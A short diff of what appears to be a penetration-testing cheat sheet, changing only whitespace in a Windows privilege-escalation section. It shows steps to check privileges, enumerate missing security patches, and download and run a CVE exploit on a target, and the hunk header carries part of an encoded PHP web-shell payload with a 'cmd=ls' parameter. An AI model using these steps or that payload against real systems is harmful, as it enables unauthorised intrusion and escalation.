@@ -903,7 +903,7 @@ NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`
 - Exploits for unpatched
   - check current privilege
     `whoami /priv`  
-  - enumerate windows version and security patches
+  - enumerate windows version and security patches  
     `Get-CimInstance -Class win32_quickfixengineering | Where-Object { $_.Description -eq "Security Update" }`
   - search elevation of privileges CVE and download to target
   - Execute the .\CVE-xxx-xxxx.exe and priviledge escalate
